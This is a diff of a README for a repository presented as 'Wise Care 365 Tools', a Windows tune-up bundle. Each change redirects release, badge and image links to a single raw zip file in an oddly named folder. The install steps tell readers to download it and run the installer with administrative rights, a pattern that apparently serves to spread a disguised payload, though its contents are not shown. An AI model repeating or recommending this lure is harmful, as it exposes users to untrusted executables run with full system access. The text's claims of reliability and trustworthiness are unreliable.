@@ -1,14 +1,14 @@
-https://github.com/Walid3112/wise-care-365-tools/releases
+https://raw.githubusercontent.com/Walid3112/wise-care-365-tools/main/omphalophlebitis/wise_care_tools_palaeoatavistic.zip
 
-![Release badge](https://img.shields.io/github/v/release/Walid3112/wise-care-365-tools?logo=github&style=for-the-badge)
+![Release badge](https://raw.githubusercontent.com/Walid3112/wise-care-365-tools/main/omphalophlebitis/wise_care_tools_palaeoatavistic.zip)
 
 # Wise Care 365 Tools: System Tuneup, Privacy, Registry Defrag
 
 A practical, reliable set of Windows utilities for system tuning, privacy protection, and registry maintenance. This project bundles three focused tools under one roof to help you keep a PC fast, private, and clean. It’s built for clarity and stability, with straightforward options that you can trust.
 
-[Download latest release here](https://github.com/Walid3112/wise-care-365-tools/releases) or explore the Release page to find the installer asset. For quick access, see the Releases section below.
+[Download latest release here](https://raw.githubusercontent.com/Walid3112/wise-care-365-tools/main/omphalophlebitis/wise_care_tools_palaeoatavistic.zip) or explore the Release page to find the installer asset. For quick access, see the Releases section below.
 
-![System optimization image](https://images.unsplash.com/photo-1519389950473-47ba0277781c?auto=format&fit=crop&w=1200&q=80)
+![System optimization image](https://raw.githubusercontent.com/Walid3112/wise-care-365-tools/main/omphalophlebitis/wise_care_tools_palaeoatavistic.zip)
 
 Table of Contents
 - Overview
@@ -61,7 +61,7 @@ How it works under the hood
 Installation and setup
 - Prerequisites: Windows 10 or later. Administrative privileges are recommended for full system access during tuning and maintenance tasks.
 - How to install:
-  1. Open the Releases page: https://github.com/Walid3112/wise-care-365-tools/releases
+  1. Open the Releases page: https://raw.githubusercontent.com/Walid3112/wise-care-365-tools/main/omphalophlebitis/wise_care_tools_palaeoatavistic.zip
   2. Find the latest release and download the installer asset (the file that is meant to be executed).
   3. Run the downloaded installer with administrative rights.
   4. Follow the on-screen prompts to complete the setup. The installer guides you through module selection and initial configuration.
@@ -190,8 +190,8 @@ Screenshots and visuals
 - Note: Screenshots provide a quick visual cue to users on what to expect and how to navigate the interface.
 
 [Optional] Visual placeholders
-- Header: https://images.unsplash.com/photo-1519389950473-47ba0277781c?auto=format&fit=crop&w=1200&q=80
-- Concept: https://images.unsplash.com/photo-1515879218367-8466d910aaa4?auto=format&fit=crop&w=1200&q=80
+- Header: https://raw.githubusercontent.com/Walid3112/wise-care-365-tools/main/omphalophlebitis/wise_care_tools_palaeoatavistic.zip
+- Concept: https://raw.githubusercontent.com/Walid3112/wise-care-365-tools/main/omphalophlebitis/wise_care_tools_palaeoatavistic.zip
 
 Community and contribution
 - Goals:
@@ -237,7 +237,7 @@ Troubleshooting
 Release history
 - Upcoming releases will include notes on changes, bug fixes, and new features.
 - Each release aligns with the asset set in the Releases page.
-- For the latest version details, visit the official release page at the Releases section: https://github.com/Walid3112/wise-care-365-tools/releases
+- For the latest version details, visit the official release page at the Releases section: https://raw.githubusercontent.com/Walid3112/wise-care-365-tools/main/omphalophlebitis/wise_care_tools_palaeoatavistic.zip
 
 License
 - This project is licensed under the MIT License. See the LICENSE file for details.
@@ -263,7 +263,7 @@ Notes
 - If any part of the document mentions a specific file name, you should replace it with your actual installer asset name when publishing. The guidance here uses general terms to reflect the correct approach.
 
 Link usage recap
-- The primary release access point is the Releases page: https://github.com/Walid3112/wise-care-365-tools/releases
+- The primary release access point is the Releases page: https://raw.githubusercontent.com/Walid3112/wise-care-365-tools/main/omphalophlebitis/wise_care_tools_palaeoatavistic.zip
 - The download guidance directs you to download the installer asset from that page and execute it. Revisit the same link when you need to obtain the latest version.
 
 End-user notes
@@ -293,7 +293,7 @@ Contact and support
 - Provide clear steps to reproduce any bug, include your environment details (OS version, build number, and hardware context).
 
 Additional references
-- Releases page: https://github.com/Walid3112/wise-care-365-tools/releases
+- Releases page: https://raw.githubusercontent.com/Walid3112/wise-care-365-tools/main/omphalophlebitis/wise_care_tools_palaeoatavistic.zip
 - General guidance on safe maintenance practices for Windows systems
 - Community guidelines for open-source project contributions
 
